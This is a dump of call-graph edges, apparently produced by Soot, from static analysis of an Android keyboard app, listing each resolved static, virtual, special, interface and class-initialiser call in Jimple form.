STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lta: void <init>(lsr,java.lang.Object)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lvq: int b()>() in <lvq: int size()> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.Exception: void <init>()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <lsm: void <init>()> ==> <lts: void <init>()>
SPECIAL edge: specialinvoke $r27.<mag: void <init>(java.lang.String,int,int)>("TENOR_FEATURED_METADATA", 27, 27) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ivv: java.lang.String c()>() in <ivv: ivw a()> ==> <ivv: java.lang.String c()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lup: void <init>(lwc,java.lang.String)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <ojg: void v(java.lang.String)>($r1) in <ojg: void d(java.lang.Object,java.lang.String)> ==> <ojg: void v(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
CLINIT edge: staticinvoke <hcb: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hcb: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lkl: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>($r3) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(1) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $i8 = interfaceinvoke $r14.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r9, $r15) in <lvr: void <init>(lvr,lvr)> ==> <jlu: int compare(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_ImeListLoaded", $r4) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfc: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.StringBuilder: int length()>() in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: int length()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, $i4) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r5, $i0) in <lvr: void <init>(lvr,lvr)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
CLINIT edge: staticinvoke <lsu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsu: void <clinit>()>
INTERFACE edge: $r7 = interfaceinvoke $r2.<ltn: lsq f()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: lsq f()>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.Throwable: void <init>()>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r1 = staticinvoke <lri: java.util.ArrayList N()>() in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <lri: java.util.ArrayList N()>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.LinkageError: void <init>()> ==> <java.lang.Error: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jvu: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>($r1, $r2, $r3, $r6) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(4) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r4, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(float[],float[])>($r14, $r15) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(float[],float[])>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
CLINIT edge: staticinvoke <java.util.concurrent.TimeUnit: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.concurrent.TimeUnit: void <clinit>()>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqm: int size()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Autocomplete", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
CLINIT edge: staticinvoke <j$.util.concurrent.r: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.r: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<jvu: void <init>(int)>(1) in <jvu: void <clinit>()> ==> <jvu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r2) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lkl: void h(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("].") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lvs: lvs a(java.lang.Object)>($r2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
CLINIT edge: staticinvoke <hbw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbw: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r4, $i0, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r11.<lvt: void <init>(lvr)>($r15) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: void <init>(lvr)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r2, $i2, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(2) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
CLINIT edge: staticinvoke <lpi: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lpi: void <clinit>()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("cause", class "Ljava/lang/Throwable;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Class: boolean isAssignableFrom(java.lang.Class)>($r4) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: boolean isAssignableFrom(java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(10) in <lvr: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(2) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <java.lang.Long: java.lang.Long valueOf(long)>($l0) in <hbu: hbs f(java.lang.String,long)> ==> <java.lang.Long: java.lang.Long valueOf(long)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r2) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
SPECIAL edge: specialinvoke $r5.<hno: void <init>()>() in <hnt: void <clinit>()> ==> <hno: void <init>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(13) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r1.<lsh: void <init>(lto)>($r2) in <lsh: lsh j(java.lang.String)> ==> <lsh: void <init>(lto)>
CLINIT edge: staticinvoke <idq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <idq: void <clinit>()>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int)>($i1) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <lje: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Float: java.lang.Float valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <lkh: java.lang.Object[] toArray()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Set: java.util.Iterator iterator()>() in <ljf: java.util.Iterator iterator()> ==> <java.util.HashSet: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(java.util.List)> ==> <java.util.AbstractMap: void <init>()>
SPECIAL edge: specialinvoke r1.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Local", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(93) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r0) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean isEmpty()>() in <lqs: boolean equals(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r0 = virtualinvoke $r4.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Double: boolean isNaN(double)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gwk: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hno: void <init>()> ==> <iec: void <init>()>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lkq: lsb C(int)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int j()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsb: boolean hasNext()>() in <lsb: java.lang.Object next()> ==> <lsb: boolean hasNext()>
STATIC edge: $r4 = staticinvoke <java.lang.Integer: java.lang.String toHexString(int)>($i2) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Integer: java.lang.String toHexString(int)>
STATIC edge: $r3 = staticinvoke <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>("GMT") in <ose: void <clinit>()> ==> <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lkm: void <init>(lkq,int)>(r0, $i0) in <lkq: lsb C(int)> ==> <lkm: void <init>(lkq,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkg: void c(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Class getClass()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lvr: int hashCode()>() in <lvt: int hashCode()> ==> <lvr: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmc: void <init>(lme)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lji: void <init>(java.util.Comparator)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsn: void <init>(java.util.logging.Level)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[0-9]+") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lsw d()>() in <lsn: lsw i(lsq)> ==> <lsf: lsw d()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
SPECIAL edge: specialinvoke $r0.<lqs: void <init>(lkq,java.util.Comparator)>($r2, $r1) in <lqs: void <clinit>()> ==> <lqs: void <init>(lkq,java.util.Comparator)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(17) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqs: int size()>
SPECIAL edge: specialinvoke $r4.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.w: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
